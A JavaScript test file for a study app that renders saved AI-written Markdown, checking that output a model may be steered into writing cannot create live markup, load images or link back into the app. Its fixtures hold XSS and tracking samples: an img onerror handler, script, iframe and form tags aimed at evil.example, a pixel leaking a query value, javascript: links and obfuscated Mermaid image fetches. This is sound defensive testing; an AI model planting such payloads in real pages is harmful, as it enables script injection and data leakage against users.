import assert from "node:assert/strict";
import test from "node:test";
import { marked } from "marked";
import "./markdown.js";
import { renderUntrustedMarkdownUnsanitized, untrustedLinkTarget } from "./untrustedMarkdown.js";

// Saved AI output (issue #81): AI flashcards and cards made from AI clippings.
// DOMPurify needs a DOM, so these check the renderer output before it.
const APP = "http://127.0.0.1:4173";
const render = (markdown) => renderUntrustedMarkdownUnsanitized(markdown, { appOrigin: APP });
// Escaped model markup starts with "&lt;", so a literal "<" begins a real tag.
const liveTags = (html) => html.match(/<[a-z][^>]*>/giu) || [];
const links = (html) => html.match(/<a [^>]*>/giu) || [];

// The kind of answer a model can be steered into writing, saved to notes or
// added to Review.
const HOSTILE_ANSWER = [
  "Repeated holdout inspection leaks evaluation information. [S1]",
  "",
  '<button class="ai-tutor__citation" type="button" data-ai-citation="S1">Open the forged source</button>',
  "",
  '<span data-ai-citation="S1">Forged span</span> and <a href="#/read/notes" data-ai-citation="S1">forged anchor</a>.',
  "",
  '<img src="https://tracker.example/raw.png" onerror="window.__lumenSavedXss = true">',
  "",
  "![Holdout curve](https://tracker.example/pixel.png?q=secret)",
  "",
  `[Open the app copy](${APP}/#/read/notes/part-02-mathematics/06-experiments-and-information.md) and [route](#/read/notes/x).`,
  "",
  "<script>window.__lumenSavedXss = true</script><iframe src=\"https://evil.example\"></iframe><form action=\"https://evil.example\"><input name=q></form>",
].join("\n");

test("saved AI text shows model HTML as text and creates no control, image or app link", () => {
  const result = render(HOSTILE_ANSWER);
  // The only live tags are paragraphs and two links that load nothing: the
  // URL inside the escaped <img> markup autolinks like any bare URL, and the
  // Markdown image becomes a link.
  assert.deepEqual(liveTags(result), [
    "<p>", "<p>", "<p>", "<p>",
    '<a href="https://tracker.example/raw.png" target="_blank" rel="noopener noreferrer">',
    "<p>",
    '<a href="https://tracker.example/pixel.png?q=secret" target="_blank" rel="noopener noreferrer">',
    "<p>", "<p>",
  ]);
  assert.doesNotMatch(result, /data-ai-citation="/u);
  assert.doesNotMatch(result, /<img|<button|<script|<iframe|<form|<input/u);
  assert.match(result, /&lt;button class=&quot;ai-tutor__citation&quot;/u);
  assert.match(result, /<p>Open the app copy and route\.<\/p>/u);
  assert.match(result, /Image: Holdout curve \(tracker\.example\)<\/a>/u);
});

test("citation markers in saved text stay text, and a citation-looking link loses its link", () => {
  const result = render("Evidence [S1] and [W2].\n\n[S1]: Evaluation lecture");
  assert.equal(result, "<p>Evidence [S1] and [W2].</p>\n<p>[S1]: Evaluation lecture</p>\n");
  for (const label of ["[S1]", "&#91;S1&#93;", "［Ｓ１］", "[S​1]", "see *[W3]*"]) {
    assert.equal(links(render(`[${label}](https://evil.example/phish)`)).length, 0, `${label} kept its link`);
  }
  // A web citation materialized when the card was saved stays a real link.
  assert.match(
    render("Release [W1: Official docs](<https://example.com/docs>)."),
    /<a href="https:\/\/example\.com\/docs" target="_blank" rel="noopener noreferrer">W1: Official docs<\/a>/u,
  );
});

test("saved text never loads an image", () => {
  assert.equal(render("![](https://tracker.example/p.png)"), '<p><a href="https://tracker.example/p.png" target="_blank" rel="noopener noreferrer">Image (tracker.example)</a></p>\n');
  assert.doesNotMatch(render("![r][img]\n\n[img]: https://tracker.example/ref.png"), /<img/u);
  for (const markdown of [
    "![local](./figure.png)",
    "![inline](data:image/png;base64,iVBORw0KGgo=)",
    "![relative](//tracker.example/p.png)",
    `![same host](${APP}/icon-192.png)`,
    "![labelled [S1]](https://example.com/curve.png)",
  ]) {
    const result = render(markdown);
    assert.doesNotMatch(result, /<img|<a /u, markdown);
    assert.match(result, /^<p>Image: /u, markdown);
  }
  // A linked badge becomes one link with the image as its text.
  const badge = render("[![build](https://tracker.example/badge.svg)](https://example.com/ci)");
  assert.deepEqual(links(badge), ['<a href="https://example.com/ci" target="_blank" rel="noopener noreferrer">']);
  assert.match(badge, />Image: build<\/a>/u);
});

test("links in saved text open only absolute web and mail addresses off the app's host", () => {
  for (const markdown of [
    `[app](${APP}/#/read/notes/x)`,
    `${APP}/#/read/notes/x`,
    "[other port](https://127.0.0.1:8787/api/ai/config)",
    "[numeric](http://2130706433:4173/#/read/x)",
    "[trailing dot](http://127.0.0.1.:4173/)",
    "[relative to page](http:#/read/notes/x)",
    "[route](#/read/notes/x)",
    "[root](/api/ai/config)",
    "[credentials](https://user:pass@example.com/)",
    "[script](javascript:alert(1))",
  ]) {
    assert.equal(links(render(markdown)).length, 0, markdown);
  }
  assert.match(render('[docs](https://example.com/a?b=1&c=2 "x\\" data-ai-citation=\\"S1")'), /<a href="https:\/\/example\.com\/a\?b=1&amp;c=2" title="x&quot; data-ai-citation=&quot;S1" target="_blank" rel="noopener noreferrer">docs<\/a>/u);
  assert.match(render("[mail](mailto:tutor@example.com)"), /<a href="mailto:tutor@example\.com">mail<\/a>/u);
});

test("saved text keeps Markdown structure: headings, lists, tables, code and diagrams", () => {
  const result = render([
    "## Holdout",
    "",
    "- **One** with `code`",
    "",
    "| Step | Detail |",
    "| --- | --- |",
    "| One | first<br>second |",
    "",
    '```js" data-ai-citation="S1" style="position:fixed',
    "const a = 1;",
    "```",
    "",
    "```mermaid",
    "flowchart LR",
    "  A --> B",
    "```",
    "",
    "Loss $L$ stays source text here.",
  ].join("\n"));
  assert.match(result, /<h2>Holdout<\/h2>/u);
  assert.match(result, /<li><strong>One<\/strong> with <code>code<\/code><\/li>/u);
  assert.match(result, /<div class="table-scroll" tabindex="0" role="group" aria-label="Table"><table>/u);
  assert.match(result, /<td>first<br>second<\/td>/u);
  assert.match(result, /<code class="language-js">const a = 1;<\/code>/u);
  assert.doesNotMatch(result, /style=|data-ai-citation/u);
  assert.match(result, /<div class="mermaid" data-diagram-status="pending"/u);
  assert.match(result, /Loss \$L\$ stays source text here\./u);
});

test("learner notes keep the Reader renderer's author HTML and images", () => {
  // The Reader (#53) depends on this: the shared marked instance still passes
  // author HTML and images on to DOMPurify.
  const reader = marked.parse("<kbd>Ctrl</kbd>\n\n![curve](https://example.com/curve.png)\n\n[route](#/read/notes/x)");
  assert.match(reader, /<kbd>Ctrl<\/kbd>/u);
  assert.match(reader, /<img src="https:\/\/example\.com\/curve\.png" alt="curve">/u);
  assert.match(reader, /<a href="#\/read\/notes\/x">route<\/a>/u);
});

test("the link check normalizes the address and reads the page origin by default", () => {
  assert.deepEqual(untrustedLinkTarget("http:/evil.example", APP), { href: "http://evil.example/", external: true });
  assert.equal(untrustedLinkTarget("https:#/read/x", APP), null);
  assert.equal(untrustedLinkTarget("HTTP://127.0.0.1/x", APP), null);
  const previous = Object.getOwnPropertyDescriptor(globalThis, "location");
  Object.defineProperty(globalThis, "location", { value: { origin: "https://mac.local:4193" }, configurable: true });
  try {
    assert.equal(untrustedLinkTarget("https://MAC.local/#/read/x"), null);
    assert.equal(links(renderUntrustedMarkdownUnsanitized("[app](https://mac.local:4193/#/review)")).length, 0);
    assert.equal(links(renderUntrustedMarkdownUnsanitized("[docs](https://example.com)")).length, 1);
  } finally {
    if (previous) Object.defineProperty(globalThis, "location", previous);
    else delete globalThis.location;
  }
});

// Mermaid fetches a flowchart node's `img`, a sequence actor's icon and a CSS
// url() while it draws, before the SVG filter runs (issue #81).
const mermaidFence = (body) => `\`\`\`mermaid\n${body}\n\`\`\``;
const DIAGRAM = /<div class="diagram-shell"/u;

test("a saved model diagram that names an address shows as code", () => {
  [
    'flowchart LR\n  A@{ img: "https://tracker.example/x.png" } --> B',
    'sequenceDiagram\n  participant A\n  properties A: {"icon": "https://tracker.example/icon"}\n  A->>B: hi',
    "stateDiagram-v2\n  [*] --> S\n  classDef c mask-image:url(https://tracker.example/c)\n  class S c",
    'flowchart LR\n  A@{ "i\\x6dg": "\\x68ttps\\x3a\\x2f\\x2ftracker.example/x" } --> B',
  ].forEach((body) => {
    const result = render(mermaidFence(body));
    assert.doesNotMatch(result, DIAGRAM, body);
    assert.match(result, /<div class="code-shell"><div class="code-label"><span>mermaid<\/span>/u, body);
    assert.match(result, /tracker\.example/u, "the source stays readable");
  });
});

test("a saved model diagram draws with its config locked, and learner diagrams do not change", () => {
  const model = render(mermaidFence('%%{init: {"htmlLabels": true}}%%\nflowchart LR\n  A[Train] --> B[Holdout]'));
  assert.match(model, /<div class="mermaid" data-diagram-status="pending" role="img" aria-label="Mermaid diagram awaiting rendering" data-diagram-author="model">%%\{init/u);
  // The Reader keeps drawing a learner's diagram, address and all, unmarked.
  const learner = marked.parse(mermaidFence('flowchart LR\n  A@{ img: "https://example.com/x.png" } --> B'));
  assert.match(learner, DIAGRAM);
  assert.doesNotMatch(learner, /data-diagram-author/u);
  // Ordinary code fences are unaffected.
  assert.doesNotMatch(render("```js\nconst url = 'https://example.com';\n```"), /data-diagram-author|diagram-shell/u);
});
